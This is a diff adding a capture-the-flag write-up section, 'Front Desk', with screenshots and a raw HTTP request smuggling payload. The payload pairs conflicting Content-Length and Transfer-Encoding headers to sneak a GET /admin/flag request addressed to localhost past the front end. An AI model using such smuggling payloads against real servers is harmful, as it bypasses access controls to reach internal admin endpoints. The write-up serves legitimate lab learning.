@@ -88,3 +88,29 @@ And we got the flag
 
 <img width="833" height="519" alt="image" src="https://github.com/user-attachments/assets/5fbc3424-3e3b-4646-b773-e77db665000f" />
 
+# Front Desk
+I opened the site and was informed that there was an public desk and one that was internal.
+<img width="1160" height="610" alt="image" src="https://github.com/user-attachments/assets/1d1caacf-8c0d-4357-986f-861a1681e935" />
+
+Clicking on the submit button revealed nothing else.
+<img width="1150" height="426" alt="image" src="https://github.com/user-attachments/assets/9f8956e6-d39b-47c4-8ba1-24286bbd8b4a" />
+
+I noticed that the server was using HTTP/1.1 which is notoriously vulnerable to request smuggling
+<img width="329" height="451" alt="image" src="https://github.com/user-attachments/assets/0d2891d9-7732-4036-b30e-e616dd49ac56" />
+
+I duplicated the submit post request in Burp Suite adding content that can be interpreted as a request to localhost.
+```
+POST /submit HTTP/1.1
+Host: 194.102.62.183:22622
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/flag HTTP/1.1
+Host: localhost
+```
+And success.
+
+<img width="618" height="623" alt="image" src="https://github.com/user-attachments/assets/d6bd644d-15a2-49be-8299-9b30f93293c3" />
